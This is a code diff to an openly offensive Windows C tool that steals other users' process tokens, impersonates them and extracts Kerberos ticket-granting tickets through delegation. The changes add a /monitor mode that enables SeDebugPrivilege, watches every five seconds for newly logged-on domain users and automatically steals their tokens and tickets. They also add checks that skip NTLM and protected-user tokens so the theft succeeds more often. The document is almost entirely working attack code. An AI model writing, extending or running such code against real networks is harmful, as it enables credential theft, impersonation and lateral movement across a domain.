@@ -17,6 +17,12 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ntdll.lib")
 
+typedef struct _PROCESSED_USER {
+    LPWSTR szUsername;
+    struct _PROCESSED_USER* pNext;
+} PROCESSED_USER, * PPROCESSED_USER;
+PPROCESSED_USER g_pProcessedUsers = NULL;
+
 BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {
     TOKEN_PRIVILEGES TokenPrivs = { 0 };
     LUID Luid = { 0 };
@@ -105,6 +111,97 @@ BOOL GetTokenUserW(_In_ HANDLE hToken, _Out_ LPWSTR* szUsername) {
     return bResult;
 }
 
+
+
+BOOL IsUserAlreadyProcessed(LPCWSTR szUsername) {
+    PPROCESSED_USER p = g_pProcessedUsers;
+    while (p) {
+        if (_wcsicmp(p->szUsername, szUsername) == 0) {
+            return TRUE;
+        }
+        p = p->pNext;
+    }
+    PPROCESSED_USER pNew = (PPROCESSED_USER)HeapAlloc(GetProcessHeap(), 0, sizeof(PROCESSED_USER));
+    if (pNew) {
+        DWORD dwLen = (DWORD)(wcslen(szUsername) + 1) * sizeof(WCHAR);
+        pNew->szUsername = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, dwLen);
+        if (pNew->szUsername) {
+            wcscpy_s(pNew->szUsername, dwLen / sizeof(WCHAR), szUsername);
+            pNew->pNext = g_pProcessedUsers;
+            g_pProcessedUsers = pNew;
+        }
+    }
+    return FALSE;
+}
+
+BOOL IsDomainUserAccount(HANDLE hToken) {
+    PTOKEN_USER pTokenUser = NULL;
+    DWORD dwSize = 0;
+    BOOL isDomainUser = FALSE;
+
+    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
+    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+        pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
+        if (pTokenUser) {
+            if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
+                PSID pSid = pTokenUser->User.Sid;
+
+                if (!IsWellKnownSid(pSid, WinLocalSid) &&                   // S-1-2-0
+                    !IsWellKnownSid(pSid, WinLocalSystemSid) &&             // S-1-5-18
+                    !IsWellKnownSid(pSid, WinServiceSid)) {                 // S-1-5-6
+
+                    WCHAR userName[256] = { 0 };
+                    WCHAR domainName[256] = { 0 };
+                    DWORD userNameSize = 256;
+                    DWORD domainNameSize = 256;
+                    SID_NAME_USE sidType;
+
+                    if (LookupAccountSidW(NULL, pSid, userName, &userNameSize,
+                        domainName, &domainNameSize, &sidType)) {
+                        if (sidType == SidTypeUser) {
+                            isDomainUser = TRUE;
+                        }
+                    }
+                }
+            }
+            HeapFree(GetProcessHeap(), 0, pTokenUser);
+        }
+    }
+
+    return isDomainUser;
+}
+
+BOOL IsNTLMToken(HANDLE hToken) {
+    TOKEN_STATISTICS tokenStats = { 0 };
+    DWORD dwLength = 0;
+    PSECURITY_LOGON_SESSION_DATA pSessionData = NULL;
+    BOOL isNTLM = FALSE;
+
+    if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &dwLength)) {
+        return FALSE;
+    }
+
+    NTSTATUS status = LsaGetLogonSessionData(&tokenStats.AuthenticationId, &pSessionData);
+    if (status == 0 && pSessionData) {
+        if (pSessionData->AuthenticationPackage.Buffer) {
+            if (_wcsicmp(pSessionData->AuthenticationPackage.Buffer, L"NTLM") == 0) {
+                wprintf(L"[-] NTLM authentication detected\n"); fflush(stdout);
+                isNTLM = TRUE;
+            }
+            else if (_wcsicmp(pSessionData->AuthenticationPackage.Buffer, L"Kerberos") == 0) {
+                wprintf(L"[+] Kerberos authentication detected\n"); fflush(stdout);
+                isNTLM = FALSE;
+            }
+            else {
+                wprintf(L"[*] Authentication package: %wZ\n", &pSessionData->AuthenticationPackage); fflush(stdout);
+            }
+        }
+        LsaFreeReturnBuffer(pSessionData);
+    }
+
+    return isNTLM;
+}
+
 int forgeTGT(wchar_t* spn, int encType)
 {
     int resultStatus = 1;
@@ -126,6 +223,13 @@ int forgeTGT(wchar_t* spn, int encType)
     SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer };
     ULONG contextAttr;
     SECURITY_STATUS initSecurity = InitializeSecurityContextW(&hCredential, NULL, (SEC_WCHAR*)spn, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &newContext, &output, &contextAttr, NULL);
+
+    if (initSecurity == 0x8009030e) {
+        wprintf(L"[-] Error 0x8009030e: User is a protected user. Skipping.\n");
+        fflush(stdout);
+        FreeCredentialsHandle(&hCredential);
+        return resultStatus;
+    }
 
     if (initSecurity == SEC_E_OK || initSecurity == SEC_I_CONTINUE_NEEDED)
     {
@@ -227,7 +331,8 @@ int forgeTGT(wchar_t* spn, int encType)
             if (base64String) free(base64String);
         }
         else {
-            wprintf(L"Error! Client is not allowed to delegate to the target SPN.\n");
+            wprintf(L"[-] Delegation failed - Account is probably sensitive and cannot be delegated\n");
+            wprintf(L"[-] InitSecurity status: 0x%lx, Context flags: 0x%lx\n", initSecurity, contextAttr);
             fflush(stdout);
         }
         FreeContextBuffer(secbufPointer.pvBuffer);
@@ -297,32 +402,15 @@ BOOL ListProcesses() {
         if (hProcess) {
             HANDLE hToken = NULL;
             if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
-                LPWSTR szProcessUser = NULL;
-                if (GetTokenUserW(hToken, &szProcessUser) && szProcessUser) {
-                    if (_wcsicmp(szCurrentUser, szProcessUser) != 0) {
-                        wchar_t* separator = wcschr(szProcessUser, L'\\');
-                        if (separator) {
-                            LPWSTR domainPart = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (separator - szProcessUser + 1) * sizeof(WCHAR));
-                            if (domainPart) {
-                                wcsncpy_s(domainPart, separator - szProcessUser + 1, szProcessUser, separator - szProcessUser);
-
-                                BOOL isLocalAccount = (_wcsicmp(domainPart, L"NT AUTHORITY") == 0 ||
-                                    _wcsicmp(domainPart, L"BUILTIN") == 0 ||
-                                    _wcsicmp(domainPart, L"NT SERVICE") == 0 ||
-                                    _wcsicmp(domainPart, L"WINDOW MANAGER") == 0 ||
-                                    _wcsicmp(domainPart, L"FONT DRIVER HOST") == 0 ||
-                                    wcschr(domainPart, L'$') != NULL);
-
-                                if (!isLocalAccount) {
-                                    wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
-                                    fflush(stdout);
-                                }
-
-                                HeapFree(GetProcessHeap(), 0, domainPart);
-                            }
+                if (IsDomainUserAccount(hToken)) {
+                    LPWSTR szProcessUser = NULL;
+                    if (GetTokenUserW(hToken, &szProcessUser) && szProcessUser) {
+                        if (_wcsicmp(szCurrentUser, szProcessUser) != 0) {
+                            wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
+                            fflush(stdout);
                         }
+                        HeapFree(GetProcessHeap(), 0, szProcessUser);
                     }
-                    HeapFree(GetProcessHeap(), 0, szProcessUser);
                 }
                 CloseHandle(hToken);
             }
@@ -366,9 +454,15 @@ void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg, int en
         wprintf(L"[+] Successfully stole token from user: %s\n", szTokenUser); fflush(stdout);
         HeapFree(GetProcessHeap(), 0, szTokenUser);
     }
-
     else {
         wprintf(L"[+] Successfully stole token from user: UNKNOWN\n"); fflush(stdout);
+    }
+
+    if (IsNTLMToken(hToken)) {
+        wprintf(L"[-] Token was created via NTLM authentication.\n"); fflush(stdout);
+        wprintf(L"[-] TGT delegation will not work. Skipping delegation attempt.\n"); fflush(stdout);
+        CloseHandle(hToken);
+        return;
     }
 
     if (!ImpersonateLoggedOnUser(hToken)) {
@@ -396,6 +490,57 @@ void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg, int en
     CloseHandle(hToken);
 }
 
+void Monitor(wchar_t* domain, wchar_t* spn, int encType) {
+    LPWSTR szCurrentUser = NULL;
+    HANDLE hCurrentToken = GetCurrentToken();
+    if (hCurrentToken) {
+        SetPrivilege(hCurrentToken, L"SeDebugPrivilege");
+        GetTokenUserW(hCurrentToken, &szCurrentUser);
+        CloseHandle(hCurrentToken);
+    }
+    wprintf(L"\n[*] Monitoring for new domain users. Press Ctrl+C to stop.\n\n");
+    fflush(stdout);
+    while (TRUE) {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
+            if (Process32FirstW(hSnapshot, &pe32)) {
+                do {
+                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
+                    if (hProcess) {
+                        HANDLE hProcessToken = NULL;
+                        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hProcessToken)) {
+                            if (IsDomainUserAccount(hProcessToken)) {
+                                LPWSTR szProcessUser = NULL;
+                                if (GetTokenUserW(hProcessToken, &szProcessUser) && szProcessUser) {
+                                    if (_wcsicmp(szCurrentUser, szProcessUser) != 0 && !IsUserAlreadyProcessed(szProcessUser)) {
+                                        if (IsNTLMToken(hProcessToken)) {
+                                            wprintf(L"[-] Skipping NTLM authenticated user: %s\n", szProcessUser);
+                                            fflush(stdout);
+                                        }
+                                        else {
+                                            wprintf(L"\n[!] New domain user detected: %s (PID: %lu)\n", szProcessUser, pe32.th32ProcessID);
+                                            fflush(stdout);
+                                            StealAndDelegate(pe32.th32ProcessID, domain, spn, encType);
+                                            wprintf(L"\n[*] Continuing monitor...\n");
+                                            fflush(stdout);
+                                        }
+                                    }
+                                    if (szProcessUser) HeapFree(GetProcessHeap(), 0, szProcessUser);
+                                }
+                            }
+                            CloseHandle(hProcessToken);
+                        }
+                        CloseHandle(hProcess);
+                    }
+                } while (Process32NextW(hSnapshot, &pe32));
+            }
+            CloseHandle(hSnapshot);
+        }
+        Sleep(5000);
+    }
+}
+
 void printToaster() {
     wprintf(L"\n");
     wprintf(L"      _   __           __________________                 __ \n");
@@ -412,10 +557,14 @@ void PrintUsage(const wchar_t* progName) {
     wprintf(L"Usage: %s <option> [arguments]\n\n", progName);
     wprintf(L"Options:\n");
     wprintf(L"  /list\t\t\t\t\tLists processes from other domain users.\n");
-    wprintf(L"  /steal <PID> <domain> <spn> [/enctype:TYPE]\tSteals token, impersonates, and runs tgtdelegation.\n\n");
+    wprintf(L"  /steal <PID> <domain> <spn> [/enctype:TYPE]\tSteals token, impersonates, and runs tgtdelegation.\n");
+    wprintf(L"  /monitor <domain> <spn> [/enctype:TYPE]\tMonitors for new user logins and auto-extracts TGTs.\n\n");
     wprintf(L"  Encryption types (optional): aes256 (default), aes128, rc4\n\n");
-    wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local\n", progName);
-    wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256\n", progName);
+    wprintf(L"Examples:\n");
+    wprintf(L"  %s /steal 6969 corp.local CIFS/dc01.corp.local\n", progName);
+    wprintf(L"  %s /steal 6969 corp.local CIFS/dc01.corp.local /enctype:aes256\n", progName);
+    wprintf(L"  %s /monitor corp.local CIFS/dc01.corp.local\n", progName);
+    wprintf(L"  %s /monitor corp.local CIFS/dc01.corp.local /enctype:rc4\n", progName);
     fflush(stdout);
 }
 
@@ -461,6 +610,25 @@ int wmain(int argc, wchar_t* argv[]) {
         }
 
         StealAndDelegate(pid, argv[3], argv[4], encType);
+    }
+    else if (_wcsicmp(argv[1], L"/monitor") == 0) {
+        if (argc < 4) {
+            wprintf(L"[!] Error: The /monitor option requires a domain and an SPN.\n\n"); fflush(stdout);
+            PrintUsage(argv[0]);
+            return 1;
+        }
+
+        int encType = 18;
+        if (argc >= 5 && _wcsnicmp(argv[4], L"/enctype:", 9) == 0) {
+            wchar_t* encTypeStr = argv[4] + 9;
+            if (_wcsicmp(encTypeStr, L"aes128") == 0) encType = 17;
+            else if (_wcsicmp(encTypeStr, L"rc4") == 0) encType = 23;
+            else if (_wcsicmp(encTypeStr, L"aes256") != 0) {
+                wprintf(L"[!] Error: Invalid encryption type. Valid options: aes256, aes128, rc4\n\n"); fflush(stdout);
+                return 1;
+            }
+        }
+        Monitor(argv[2], argv[3], encType);
     }
     else {
         wprintf(L"[!] Error: Unknown option \"%s\".\n\n", argv[1]); fflush(stdout);
